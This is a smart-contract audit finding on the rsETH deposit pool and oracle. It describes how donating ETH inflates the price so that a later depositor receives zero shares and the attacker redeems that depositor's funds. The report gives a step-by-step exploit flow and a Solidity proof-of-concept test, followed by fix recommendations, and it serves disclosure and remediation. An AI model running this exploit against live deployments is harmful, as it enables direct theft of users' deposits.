Audit Report

## Title
ETH Donation Inflates rsETH Price, Enabling First-Depositor Theft of Subsequent Depositors' Funds - (File: contracts/LRTDepositPool.sol, contracts/LRTOracle.sol)

## Summary
`LRTDepositPool` exposes an unrestricted `receive()` function that accepts arbitrary ETH. Because `getETHDistributionData()` returns `address(this).balance` as `ethLyingInDepositPool`, any donated ETH is immediately counted as protocol TVL. `LRTOracle._updateRsETHPrice()` computes `rsETHPrice = totalETHInProtocol * 1e18 / rsethSupply` via `divWad`, so a donation that inflates the numerator without increasing the denominator drives the price to an astronomically large value. A victim who then deposits with `minRSETHAmountExpected = 0` receives 0 rsETH due to integer truncation, while their ETH is permanently absorbed into the pool and recoverable by the attacker.

## Finding Description

**Root cause 1 — open `receive()`:** [1](#0-0) 

Any address can send ETH to the deposit pool without minting rsETH.

**Root cause 2 — `address(this).balance` used as TVL:** [2](#0-1) 

Donated ETH is indistinguishable from legitimately deposited ETH in the TVL calculation.

**Root cause 3 — price computed as pure ratio via `divWad`:** [3](#0-2) 

`divWad(x, y) = x * 1e18 / y` (confirmed in `WadMath.sol`). With `rsethSupply = 1 wei`, donating 20 ETH yields `newRsETHPrice = (20e18) * 1e18 / 1 = 20e36`.

**Root cause 4 — integer truncation in mint calculation:** [4](#0-3) 

With `rsETHPrice = 20e36` and victim depositing 10 ETH: `(10e18 * 1e18) / 20e36 = 0`.

**Root cause 5 — `_beforeDeposit` allows 0 rsETH when `minRSETHAmountExpected = 0`:** [5](#0-4) 

`0 < 0` is false, so no revert. The victim's ETH is accepted and 0 rsETH is minted.

**Root cause 6 — `pricePercentageLimit` defaults to 0 (disabled):** [6](#0-5) [7](#0-6) 

`pricePercentageLimit` is never set in `initialize()`, so the guard short-circuits to `false` on every price update.

**Exploit flow:**
1. `updateRSETHPrice()` → `rsETHPrice = 1e18`, `rsethSupply = 0`.
2. Attacker calls `depositETH{value: 1}(0, "")` → mints 1 wei rsETH.
3. Attacker sends 20 ETH directly to `LRTDepositPool` via `receive()`.
4. Attacker calls `updateRSETHPrice()` → `rsETHPrice = (20e18 + 1) * 1e18 / 1 ≈ 20e36`.
5. Victim calls `depositETH{value: 10 ether}(0, "")` → `rsethAmountToMint = 10e36 / 20e36 = 0`; victim's 10 ETH absorbed, 0 rsETH minted.
6. Attacker calls `updateRSETHPrice()` → `rsETHPrice ≈ 30e36`.
7. Attacker initiates withdrawal of 1 wei rsETH → `expectedAssetAmount = 1 * 30e36 / 1e18 = 30 ETH`.
8. After delay, attacker recovers 30 ETH. Net profit: 10 ETH (victim's entire deposit).

## Impact Explanation
**Critical — direct theft of user funds.** A victim depositing with `minRSETHAmountExpected = 0` (the default for naive users and many integrations) loses their entire deposit. The ETH is permanently captured by the attacker who redeems their 1-wei rsETH position at the inflated price. This matches the allowed Critical impact: "Direct theft of any user funds, whether at-rest or in-motion."

## Likelihood Explanation
**Low.** The attack is most effective when rsETH total supply is near zero (new deployment or very early stage). The attacker must donate more ETH than the victim deposits, and the victim must omit slippage protection (`minRSETHAmountExpected = 0`). The protocol is already live with significant TVL, making the near-zero supply precondition harder to achieve in practice. However, any new deployment, redeployment, or scenario where supply is artificially low reactivates the risk. The `pricePercentageLimit` being `0` by default removes the primary on-chain guard.

## Recommendation
1. **Track deposited ETH separately from `address(this).balance`:** Replace `ethLyingInDepositPool = address(this).balance` with an explicit accounting variable incremented only on legitimate deposits, so donations cannot inflate TVL.
2. **Require a minimum initial deposit / dead shares:** Mint a non-trivial amount of rsETH to a dead address on first deposit or during initialization so the supply is never near zero.
3. **Enforce `pricePercentageLimit` from deployment:** Set a non-zero `pricePercentageLimit` in `initialize()` rather than leaving it at `0`.
4. **Enforce non-zero `minRSETHAmountExpected`:** Add a protocol-level minimum (e.g., `rsethAmountToMint >= 1`) in `_beforeDeposit()` to prevent victims from silently receiving 0 rsETH.

## Proof of Concept
```solidity
function test_inflation_attack() external {
    // Step 1: seed price (supply = 0 → rsETHPrice = 1e18)
    lrtOracle.updateRSETHPrice();

    // Step 2: attacker deposits 1 wei → receives 1 wei rsETH
    lrtDepositPool.depositETH{value: 1}(0, "");

    // Step 3: attacker donates 20 ETH directly (no rsETH minted)
    (bool ok,) = address(lrtDepositPool).call{value: 20 ether}("");
    require(ok);

    // Step 4: inflate price → rsETHPrice ≈ 20e36
    lrtOracle.updateRSETHPrice();

    // Step 5: victim deposits 10 ETH with no slippage guard
    vm.prank(victim);
    lrtDepositPool.depositETH{value: 10 ether}(0, "");
    // rsethAmountToMint = (10e18 * 1e18) / 20e36 = 0 → victim gets 0 rsETH

    // Step 6: price now reflects victim's ETH → rsETHPrice ≈ 30e36
    lrtOracle.updateRSETHPrice();

    // Step 7: attacker withdraws 1 wei rsETH → receives ~30 ETH
    lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, 1, "");
    // ... wait withdrawal delay ...
    lrtWithdrawalManager.completeWithdrawal(ETH_TOKEN, "");
    // attacker net profit: 10 ETH (victim's full deposit)
}
```
